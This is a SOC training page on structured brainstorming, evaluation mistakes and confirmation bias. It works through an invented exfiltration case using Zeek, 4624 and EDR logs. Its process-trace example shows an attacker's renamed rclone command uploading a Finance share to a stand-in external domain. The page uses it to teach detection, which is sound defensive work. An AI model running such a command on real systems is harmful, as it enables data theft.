---
title: "Hypothesis Generation, Evaluation Mistakes and Confirmation Bias — Brainstorming Well and Trying to Prove Yourself Wrong"
tags:
  - training
  - blue-team
  - soc
  - analysis
  - structured-analysis
---

# Hypothesis Generation, Evaluation Mistakes and Confirmation Bias — Brainstorming Well and Trying to Prove Yourself Wrong { #hypothesis-generation }

!!! abstract "What this page covers"
    The first two steps of a structured investigation: coming up with explanations, and choosing between them. It opens with a small number puzzle (a mystery rule that produced 2 – 4 – 8) that tests how you approach an unknown. Then **structured brainstorming**: why it prevents groupthink, anchoring and premature closure, and the four principles that make it work — deferred judgement, quantity leads to quality, no self-imposed constraints and cross-fertilisation of ideas — turned into a practical fifteen-minute SOC routine. A worked case follows: an 18 GB upload from a file server that the night shift called "overnight", read from Zeek `conn.log` and `ssl.log` field by field, with fourteen brainstormed hypotheses, clustered and ranked. Next, **why you must generate several alternatives**: the anchoring effect, confirmation bias and premature closure. Then the four classic **hypothesis-evaluation mistakes** — satisficing, incrementalism, consensus and reasoning by analogy — each shown going wrong on the same case. Finally **confirmation bias** in full: the answer to the puzzle, the classic experiment behind it, and how to design *disconfirming* tests, which close the upload case with a 4624 logon, a process trace and a certificate check. The 2026 view and practice questions close the page.

!!! note "Labels"
    **[Supplement]** = practical material you need to know, **[Correction]** = a commonly repeated claim that is wrong or outdated, **[Changed]**/**[Caution]** = what has changed recently and what is risky to do the old way. The company (Kestrel Logistics), hostnames, accounts, domains, IPs, file names and log lines are invented for illustration (`.example`, documentation and private IPs). Researchers and their ideas are described in my own words.

## The 8 key points { #key-points }

1. **You can only choose the right explanation if it is on your list.** Hypothesis generation comes before evaluation, and most analysis failures start with a list that has only one item.
2. **Structured brainstorming is deliberate, methodical idea generation**, alone or in a group. Its job is to stop groupthink, anchoring and premature closure before they start.
3. **Deferred judgement is the most important rule.** Generate first, judge later. Criticising ideas as they appear makes people censor themselves, and the unusual idea — often the right one — never gets said.
4. **Quantity leads to quality, ideas range freely, and ideas cross-fertilise.** The obvious ideas come first; the useful unconventional ones come after them. Don't bound ideas, and combine them — a diverse group, including someone new to the case, helps.
5. **Anchoring and confirmation bias are why one hypothesis is never enough.** The first information you receive becomes an anchor, and you then favour, interpret and remember evidence that fits it. Together they produce confident, early, wrong case closure.
6. **Four evaluation mistakes recur:** satisficing (taking the first acceptable answer), incrementalism (considering only small variations of one idea), consensus (choosing the answer others will like) and reasoning by analogy (assuming what happened last time will happen again).
7. **The single most important analytic error is failing to try to disconfirm.** Collecting evidence that fits your favourite theory proves very little, because the same evidence usually fits other theories too.
8. **Design tests that could prove you wrong.** For each hypothesis ask "what would I see if this were *false*?" and go and look. The hypothesis that survives serious attempts to kill it is the one to trust.

## Why this matters in a SOC { #why }

Think of a detective in an old crime drama who decides in the first scene that the butler did it. From then on, every clue is read in the butler's light: the muddy boots "prove" he was in the garden, the locked door "proves" he had the key. Clues that point elsewhere are "irrelevant". The detective isn't lazy — they work hard, collect plenty of evidence and are very confident. They are just testing one story, and the evidence they collect would fit two or three other stories just as well.

Back to the technical reality. In a SOC, the "first scene" is the alert title and the first note in the ticket: "Probably the backup job." Everything the next analyst looks at gets read against that note. The previous page showed how a few discriminating tests can settle a case quickly — but only if the right hypotheses are on the table *before* you choose the tests. This page is about getting them there, and then judging them honestly. The good news is that both are skills with simple, repeatable rules.

## Warm-up: the mystery rule { #mystery-rule }

Before reading on, try this. A mystery rule lives inside a box. It accepts some sequences of three numbers and rejects others. You are shown one sequence it accepts:

```
2 – 4 – 8
```

Your goal is to find the rule. You may propose as many sequences of three numbers as you like, and for each one you are told only "fits the rule" or "doesn't fit". Before you scroll down, write down your first three test sequences and why you chose them. The point is not to get the right answer; it is to notice *how* you go about narrowing the possibilities. We'll come back to it in the section on confirmation bias.

## Structured brainstorming { #brainstorming }

### What it is and what it prevents { #brainstorming-what }

Analysis needs new ideas: questions nobody has asked yet, connections nobody expected. That needs creative thinking, and creative thinking needs the right conditions. **Structured brainstorming** is the purposeful, methodical generation of ideas — on your own or in a group — following rules that stop the setting from killing the ideas. It is especially useful when a case has stalled or when the obvious explanation doesn't quite fit.

It protects against three things you met in the perception section:

- **Groupthink** — a group converges on one view because disagreeing feels uncomfortable, often the view of the most senior or loudest person.
- **Anchoring** — the first idea mentioned becomes the reference point and everything after is a small adjustment of it.
- **Premature closure** — the case is closed as soon as one plausible explanation exists.

### The four principles { #four-principles }

The principles below come from Heuer's summary of research on creativity. Each has a reason, and the reasons are what make them stick.

**1. Deferred judgement — the most important principle.** Separate *generating* ideas from *evaluating* them, and do not judge any idea until all ideas are out. Creativity and critical thinking are both essential to an investigation, but they don't mix well in the same moment. When someone shoots down each idea as it is spoken ("no, the backup vendor never does that"), people quickly learn to say only safe ideas. They censor themselves for fear of looking foolish, and the strange idea that might have been right is never voiced. A junior analyst who has seen something odd is exactly the person most likely to stay quiet.

**2. Quantity leads to quality.** The first ideas anyone produces are the obvious ones: the usual explanations, the last incident, the alert title. Truly new ideas only start to appear once the obvious list is exhausted. So brainstorming must continue *past* the point where the obvious answers have been said — that is when it starts to be useful. A practical sign: when the group goes quiet, wait; the next ideas are often the best.

**3. No self-imposed constraints.** For the same reason you don't judge ideas on the fly, don't limit them in advance: "it can't be an insider", "it can't be the cloud tenant, that's another team's", "attackers wouldn't bother with us". Let ideas range freely. Evaluation will remove the impossible ones later — with evidence, not assumptions.

**4. Cross-fertilisation of ideas.** Combine and build on ideas to make new ones: "backup job" plus "compromised account" becomes "an attacker using the backup service account". This works best with diverse ideas, so the make-up of the group matters. Mix network and endpoint people, a cloud engineer, someone from the business — and someone who is *not* familiar with the case, who brings fresh eyes and none of the team's assumptions.

### A fifteen-minute SOC routine { #routine }

**[Supplement]** A brainstorm doesn't need a meeting room and sticky notes. A routine that works in a SOC channel or a call:

1. **State the question in one line.** "What could explain the 18 GB upload from KL-FS-02 yesterday?"
2. **Silent writing, three to five minutes.** Everyone writes their own list *before* anyone speaks. This is the best single defence against anchoring on the first or most senior voice.
3. **Round-robin sharing.** One idea per person per turn, written into a shared list without comment. Duplicates are fine.
4. **Push past the obvious.** When ideas slow down, prompt: "What if it's malicious and *looks* benign? What if it's benign and *looks* malicious? What if the data itself is wrong?"
5. **Combine.** Spend two minutes building new ideas from pairs of existing ones.
6. **Only now, cluster and evaluate** — the next step of the investigation.

Working alone at 03:00, do the same on paper: set a timer, write at least eight explanations, and force yourself to include one in each of the "malicious", "benign" and "data is wrong" groups.

### Worked example: the "overnight" upload { #upload-case }

At 06:40 the morning analyst picks up a network-anomaly alert: "Unusual outbound volume — KL-FS-02". The night shift left one note: *"Probably the new offsite backup. Low priority."*

The Zeek `conn.log` entry (Zeek writes one line per connection; fields shown as name=value for readability):

```
ts=2026-11-25T02:04:11Z  uid=CxT4n1  id.orig_h=10.30.1.12  id.orig_p=50122  id.resp_h=203.0.113.140  id.resp_p=443
proto=tcp  service=ssl  duration=10842.6  orig_bytes=19327352832  resp_bytes=41872311  conn_state=SF  history=ShADadFf
```

Field by field:

- `ts` — 02:04 UTC. KL-FS-02 sits in Kestrel's Perth office (UTC+8), so local time was 10:04 — mid-morning, during business hours. **[Supplement]** Always convert to the site's local time before judging "overnight": the night-shift note read the UTC timestamp as local time. The *note* says overnight; the *data* says working hours. One assumption ("nobody would do this during the day") just disappeared, and the hypothesis "a user or project did it during work hours" got a little stronger.
- `id.orig_h=10.30.1.12` — the originator, KL-FS-02, the finance and HR file server.
- `id.resp_h=203.0.113.140`, `id.resp_p=443` — an external address on port 443.
- `service=ssl` — Zeek recognised TLS in the traffic.
- `duration=10842.6` — just over three hours.
- `orig_bytes=19327352832` — about 18 GB *sent by the file server*. `resp_bytes` is only about 40 MB: this is overwhelmingly an upload.
- `conn_state=SF` — normal establishment and normal finish: the transfer completed.
- `history=ShADadFf` — SYN, SYN-ACK, ACK, data both ways, FIN both ways: a full, clean TCP conversation.

And the matching `ssl.log` line:

```
ts=2026-11-25T02:04:11Z  uid=CxT4n1  version=TLSv13  server_name=sync-archive.example  established=T
```

- `uid=CxT4n1` — the same connection as above.
- `version=TLSv13` — TLS 1.3, so content is encrypted and certificate details beyond the name need the `x509.log` or a separate lookup.
- `server_name=sync-archive.example` — the SNI, the name the client asked for.
- `established=T` — the handshake succeeded.

Now the team runs the routine. After five minutes of silent writing and one round-robin, the shared list reads:

| # | Hypothesis | Cluster |
| --- | --- | --- |
| H1 | The new offsite backup service started its first full copy | Benign — IT |
| H2 | A file-share migration project is copying data to a cloud provider | Benign — IT |
| H3 | A finance user is sending a large archive to auditors through a file-transfer service | Benign — business |
| H4 | Security tool telemetry or an AV cloud upload of samples | Benign — IT |
| H5 | Attacker exfiltrating data before ransomware deployment (**T1567.002 Exfiltration to Cloud Storage**) | Malicious — external |
| H6 | Attacker exfiltrating over a custom TLS channel to their own server (**T1048 Exfiltration Over Alternative Protocol** or **T1041 Exfiltration Over C2 Channel**) | Malicious — external |
| H7 | An insider copying HR data before leaving | Malicious — insider |
| H8 | A compromised backup service account used by an attacker | Malicious — combination of H1 and H5 |
| H9 | A red-team or penetration-test exercise | Authorised test |
| H10 | The sensor double-counted a mirrored link; the real volume is smaller | Data is wrong |
| H11 | NAT or DHCP confusion: the traffic came from another host behind the same address | Data is wrong |
| H12 | A misconfigured sync client looping and re-uploading the same files | Benign — error |
| H13 | Malware on the server using it as a staging point for data collected from other hosts (**T1074.002 Remote Data Staging**) | Malicious — external |
| H14 | A vendor support session pulling diagnostic dumps | Benign — third party |

Notice what the principles did. The night note's H1 is there, but so are twelve others. H8 and H13 came from cross-fertilisation. H10 and H11 — "the data is wrong" — came from the prompt in step 4 and are often forgotten, yet a five-minute check can rule them out. H7 came from the cloud engineer, who noticed that the server holds HR data; the network analysts had not considered an insider at all.

## Why brainstorm multiple alternatives? { #why-alternatives }

Why go to this trouble instead of picking the favourite and running with it? Because two unconscious biases specifically damage the search for truth, and generating several hypotheses first is the cheapest defence against both.

### The anchoring effect { #anchoring }

The **anchoring effect** is the tendency to rely too heavily on the first information received, or on previous history, when judging a situation. Negotiation shows it plainly: whoever names a number first sets the bar. Every later offer is judged against that first number, and where the deal ends depends heavily on where the anchor was dropped — even when everyone knows the first number was arbitrary.

For analysts, anchoring shows up as the assumption that an alert is like the ones seen before, or should match the hypothesis suggested by the first available evidence. In the upload case the anchor is the night note: "probably the new offsite backup". A morning analyst who starts from that note will *adjust* from it ("backup, but maybe larger than expected") instead of evaluating fresh. Receiving something first does not make it more important. Writing your own list before reading anyone else's notes — step 2 of the routine — is how you re-evaluate fresh.

### Confirmation bias and premature closure { #confirmation-overview }

**Confirmation bias** is the tendency to seek, interpret, favour and recall information in a way that confirms what you already believe or expect. People are often overconfident in their judgements, and experienced analysts more so — experience builds strong mindsets, as the memory page explained. Combined with anchoring, the pattern is predictable: an initial theory forms from the first information, evidence that fits is noticed and weighed heavily, evidence that doesn't fit is overlooked or explained away, and the case closes early with a confident, wrong conclusion. That is **premature closure**.

An assessment can only be as good as the data *and* the analysis method. You can't always improve the data, but you can stop the method from being ruined by these biases — and forcing yourself to generate several explanations before judging any is the first step.

## Hypothesis-evaluation mistakes { #evaluation-mistakes }

Once the list exists, it's time to identify the right answer. It may feel simple — take your favourite and find evidence for it — but that is exactly where analysis goes wrong. Heuer described several common decision strategies that look reasonable and lead analysts astray. Here are the four that matter most, each shown going wrong on the upload case.

### Satisficing { #satisficing }

**Satisficing** (a blend of "satisfy" and "suffice") means choosing the first answer that is good enough, instead of examining all the options to find the best one. It travels with confirmation bias: having accepted the first adequate theory, the analyst looks only for evidence that fits it, ignoring that the same evidence fits other theories too.

*On the upload case:* the analyst reads H1, checks that the backup project exists (it does — the change board approved it last month), and closes the ticket. "Backup project exists" is consistent with H1, but it is equally consistent with H8 (an attacker abusing the backup account) and says nothing against H5 or H7. The first acceptable answer was accepted; nothing was ruled out.

### Incrementalism { #incrementalism }

**Incrementalism** means focusing on a narrow set of alternatives that differ only slightly, and never considering that the situation might be something dramatically different.

*On the upload case:* the analyst considers "backup full copy", "backup with the wrong retention setting" and "backup that included the wrong folder". All three are variations of H1. The real question — is this a backup at all? — never gets asked. Incrementalism is the reason brainstorming principle 3 says "no self-imposed constraints".

### Consensus { #consensus }

**Consensus** means choosing the answer that will win the most agreement and support — telling people what they want to hear — instead of checking whether an unpopular hypothesis is actually right.

*On the upload case:* the infrastructure manager championed the new backup service and the CISO has just reported the project as a success. Concluding "possible data theft through the backup path" will be unwelcome, and the analyst knows it. Choosing H1 because everyone would prefer H1 is consensus. The counter is to state the evidence for and against each hypothesis explicitly, so the conclusion rests on what the evidence shows, not on who would like it.

### Reasoning by analogy { #analogy }

**Reasoning by analogy** means choosing an option because it worked (or failed) in a past case that looks similar, assuming it will produce the same result again. It might be true — but it doesn't logically follow. Situations that look alike on the surface often differ in what matters.

*On the upload case:* "Last quarter we had a big upload from KL-FS-01 and it was the migration project, so this is too." The analogy is with a different server, a different destination and a different time. Past experience is a fine source of *hypotheses*; it isn't evidence about *this* case. The alternative is to reason from first principles: what must be true if this is a backup, and is it?

**[Supplement]** Reasoning by analogy is not the same as using a playbook. A playbook tells you *what to check* for a type of alert; reasoning by analogy skips the checks because the case "looks like last time". Use playbooks, not analogies, as shortcuts.

## Confirmation bias: the most important error { #confirmation-bias }

### The answer to the mystery rule { #mystery-answer }

Back to the puzzle. Most people see 2 – 4 – 8, think "doubling", and test sequences like 3 – 6 – 12, 5 – 10 – 20 and 10 – 20 – 40. Each one fits. Confidence rises with every "yes", and they announce: "Each number is double the last." They are wrong. The rule is simply **any three increasing numbers**. 1 – 2 – 3 fits. 2 – 4 – 7 fits. 1 – 50 – 1000 fits.

What went wrong? Every test was designed to *confirm* the doubling theory. A sequence that fits "doubling" also fits "increasing", "even numbers", "each number bigger than the last" and many others — so a "yes" told the tester almost nothing. The tests that would have taught something are the ones that *could have failed* if the theory were true: 2 – 4 – 7 (not doubling — if it fits, doubling is dead), 8 – 4 – 2 (decreasing), 1 – 2 – 3 (small steps). This is a version of a classic experiment by the psychologist Peter Wason, published in 1960 using the sequence 2 – 4 – 6, which showed that most people search for confirming instances and rarely try to eliminate hypotheses. Look back at the three sequences you wrote down. Were they designed to prove your idea right, or to prove it wrong?

### Why confirming evidence proves so little { #why-confirming-fails }

The most important single error in analysis is the **failure to disconfirm** the other hypotheses that are also consistent with the evidence. It is easy to see why people make it. Without training, the natural approach is to think of a few hypotheses at the start, pick the likeliest, and go looking for evidence that it is true. Every confirming item feels like progress. But if that item is also consistent with the other hypotheses, it hasn't moved you at all — it has only made you more confident. The fix is to change the question you ask of the evidence: not "does this fit my theory?" but "does this rule anything out?"

### Designing disconfirming tests { #disconfirming-tests }

For each serious hypothesis, ask: **"If this hypothesis were false, what would I expect to see — and can I check it?"** Then look for that. For the upload case, after quick checks dismissed H10/H11 (the sensor is on an unmirrored span, and the server has a static IP with no NAT in between), the team picked the strongest hypotheses from each cluster:

| Hypothesis | What would show it is *false* | Check |
| --- | --- | --- |
| H1 offsite backup | Destination is not the backup vendor; no backup job ran at that time | Vendor's published IP ranges; backup console job history |
| H2 migration project | Migration is not scheduled for KL-FS-02; destination is not the project's cloud tenant | Project plan; cloud tenant's storage names |
| H3 user sending to auditors | No user session on the server; process is not a browser or the approved transfer tool | Logon events and process trace on KL-FS-02 |
| H5/H8 attacker exfiltration | Upload made by the normal backup agent process, from the backup server, to the vendor | Same process trace; logon events; destination ownership |
| H7 insider | The account involved belongs to no departing employee; access came from no user workstation | HR leaver list; logon source |

The results:

**Backup console:** the vendor's first full copy is scheduled for Saturday; no job ran on Wednesday. The vendor's ranges don't include 203.0.113.140. *H1 is inconsistent with the evidence.*

**Destination:** `sync-archive.example` was registered four days ago; its certificate is a free, automated certificate issued the same day; it is not the migration project's tenant. *H2 is inconsistent.*

**Logons on KL-FS-02** — **Windows event 4624** ("An account was successfully logged on"). It fires on the computer being logged *into*, for every successful logon, and its logon type says *how* the logon happened. Attackers care because every use of stolen credentials leaves one, on the target:

```
EventID: 4624
TargetUserName:      svc_backup
TargetDomainName:    KESTREL
LogonType:           10
IpAddress:           10.20.4.233
WorkstationName:     KL-WS-0233
TimeCreated:         2026-11-25T01:52:37Z
```

- `TargetUserName: svc_backup` — the backup *service* account. Service accounts normally log on as type 5 (service), not interactively.
- `LogonType: 10` — **RemoteInteractive**: a Remote Desktop session. Someone used RDP *as the backup service account* (**T1021.001 Remote Services: Remote Desktop Protocol**, **T1078.002 Valid Accounts: Domain Accounts**).
- `IpAddress` / `WorkstationName` — the session came from KL-WS-0233, a warehouse PC, not the backup server and not IT.
- `TimeCreated` — 01:52 UTC, twelve minutes before the upload started.

**Process trace** (EDR process events on KL-FS-02 shortly after the logon):

```
01:58:02  svc_backup  C:\ProgramData\wsync\wsync.exe  copy \\KL-FS-02\Finance remote:arch --transfers 16 --config C:\ProgramData\wsync\w.conf
```

- `C:\ProgramData\wsync\wsync.exe` — a renamed copy of `rclone`, a legitimate open-source cloud-sync tool that ransomware crews commonly use for exfiltration; the EDR identified it by its file metadata despite the new name (**T1036.003 Masquerading: Rename Legitimate Utilities**).
- `copy \\KL-FS-02\Finance remote:arch` — copy the Finance share to a remote called `arch`.
- `--transfers 16` — sixteen parallel uploads, for speed.
- `--config …\w.conf` — the remote's address and credentials live in this config file; it names `sync-archive.example`.

Now look at the hypotheses together. H1, H2, H3 and H7 are each contradicted by at least one piece of evidence. H5 and H8 are not contradicted by anything, and they merge: an attacker using the stolen backup service account over RDP from a compromised warehouse PC, exfiltrating Finance data to cloud-style storage with a renamed rclone — the classic prelude to ransomware with data-theft extortion. The case is escalated as an incident, KL-WS-0233 and KL-FS-02 are isolated, `svc_backup`'s password is reset and its interactive logon right removed, and the hunt for the initial access on KL-WS-0233 begins.

Compare the satisficing analyst: they "confirmed" H1 by checking that a backup project exists, and closed the ticket. The disconfirming analyst asked what would prove H1 *false*, looked, found it within twenty minutes — and stopped an exfiltration that would otherwise have been discovered when the ransom note arrived.

**[Supplement]** Keep a sentence in every non-trivial ticket: *"Alternatives considered and why rejected: …"*. It forces the habit, and it lets a reviewer see at a glance whether anything was actually ruled out. Full, formal scoring of hypotheses against evidence is the subject of the next technique, Analysis of Competing Hypotheses.

## The 2026 view { #trends }

!!! success "[2026 Current] Still valid"
    The rules of structured brainstorming, the four evaluation mistakes and the central lesson — try to disconfirm, not confirm — are unchanged and still taught in intelligence analysis and SOC training. Hypothesis-driven threat hunting, where each hunt starts from a stated hypothesis and is designed so that it could come back negative, is standard practice. The worked case is current too: exfiltration with legitimate sync tools such as rclone, and theft of data for extortion before (or instead of) encryption, remain among the most commonly reported ransomware behaviours in 2025–2026, and abuse of over-privileged service accounts is a recurring finding.

!!! info "[Changed] What has changed"
    - **AI is now a common brainstorming partner.** Analysts ask an AI assistant "what else could explain this?" It is good at the *quantity* step and at offering ideas from outside the team's experience — real cross-fertilisation. But it is also an anchor: its first answer shapes what you think next, and it can invent plausible details. Use it *after* your own silent list, not before, and treat its ideas as hypotheses to test, not findings.
    - **"Consensus" has a new source: the tool's verdict.** When an AI triage tool or a vendor's managed-detection team has already labelled an alert benign, disagreeing feels like the unpopular answer. The rule is the same: state the evidence for and against.
    - **Data-theft-only extortion is common.** Many groups now steal data and extort without encrypting anything, so "no ransomware appeared" no longer means "the upload was harmless". Exfiltration alerts deserve System 2 on their own merit.
    - **Better telemetry for disconfirming tests.** Identity logs, EDR process trees and cloud audit logs make "what would show this is false?" quicker to check than in older environments — which removes most of the excuse for satisficing.

!!! warning "[Caution] Wrong or risky to do the old way"
    - **Don't let brainstorming delay containment of active harm.** If data is leaving *right now*, contain first (block the destination, isolate, disable the account) and brainstorm in parallel. Structured methods are for getting the judgement right, not a reason to wait.
    - **Don't brainstorm only within the SOC.** An exfiltration question often needs the system owner, a cloud engineer or HR. Excluding them is a self-imposed constraint.
    - **Don't treat "alternatives considered" as a formality.** Writing "considered benign, rejected" without saying what evidence rejected it is satisficing in a nicer format.
    - **Don't read times without the time zone.** As the case showed, judging "overnight" from UTC timestamps can anchor the whole investigation on a false fact. Always convert to the site's local time.

## Practice questions { #quiz }

### Question 1

A shift lead runs a brainstorm on a strange authentication alert. As each idea is suggested, the lead says whether it is likely or not, "to save time". Two junior analysts stop contributing. Which principle is being broken, why does it matter, and how would you restructure the session?

??? success "Answer and explanation"
    **Deferred judgement**, the most important principle, is broken. Evaluating ideas as they appear makes people censor themselves for fear of criticism — especially junior staff in front of a senior — so unusual ideas, which are often the valuable ones, are never voiced. It also lets the lead's first impression anchor the whole group.

    Restructure: state the question in one line; give everyone three to five minutes of **silent, individual writing** first; share round-robin with no comments; keep going past the obvious ideas (**quantity leads to quality**), with prompts such as "what if it's malicious but looks benign?" and "what if the data is wrong?"; combine ideas (**cross-fertilisation**), ideally with someone from outside the case; and only then cluster and evaluate.

### Question 2

For each statement, name the evaluation mistake: (a) "Same as the ticket from March — it was a printer driver then, close it." (b) "It's either the backup running long or the backup running twice." (c) "The backup project is confirmed, so the upload is explained." (d) "Management just signed off on this vendor; flagging it as suspicious will cause trouble."

??? success "Answer and explanation"
    (a) **Reasoning by analogy** — assuming the result of a past, similar-looking case will repeat, without checking what differs. (b) **Incrementalism** — only small variations of one idea are considered; "is it a backup at all?" is never asked. (c) **Satisficing** — the first acceptable explanation is accepted and confirming evidence is gathered for it, even though that evidence is also consistent with other hypotheses (such as an attacker using the backup account). (d) **Consensus** — choosing the answer people want to hear instead of testing whether the unpopular hypothesis is true.

### Question 3

The mystery rule produced 6 – 8 – 10. A colleague tests 12 – 14 – 16, 20 – 22 – 24 and 100 – 102 – 104, gets "fits" each time, and concludes "even numbers increasing by 2". What is wrong with the method? Propose three better tests and explain what each one could tell you. Then translate the lesson into one sentence of SOC practice.

??? success "Answer and explanation"
    Every test was chosen to *confirm* the colleague's theory. Each "fits" is also consistent with many other rules (any increasing numbers, any even numbers, any numbers less than 1000 …), so the tests barely narrowed anything. This is confirmation bias — the failure to try to disconfirm.

    Better tests are ones that would *fail* if the theory were true: **7 – 9 – 11** (odd numbers — if it fits, "even" is wrong); **6 – 8 – 20** (not steps of 2 — if it fits, "increase by 2" is wrong); **10 – 8 – 6** (decreasing — if it fails, order matters, which supports "increasing"). Each result rules something in or out.

    SOC lesson: for every hypothesis, ask "what would I see if this were false?" and look for that, rather than collecting evidence that fits your favourite explanation.

## Related { #related }

- [System 1 and System 2, "Do you need more data?" and structured analytic techniques](system1-2-sat.md) — previous page
- [Perception](../analyst-cognition/perception.md) · [Memory and experience](../analyst-cognition/memory-experience.md) — mindsets, anchoring and premature closure
- [Spotting data exfiltration and destruction](../alert-triage/exfil-destruction-sensitive.md) — why exfiltration alerts rank high
- [Login events](../important-events/logins.md) — 4624 and logon types in depth
- [RDP](../../../adversary/rdp.md) · [Persistence](../../../adversary/persistence.md)
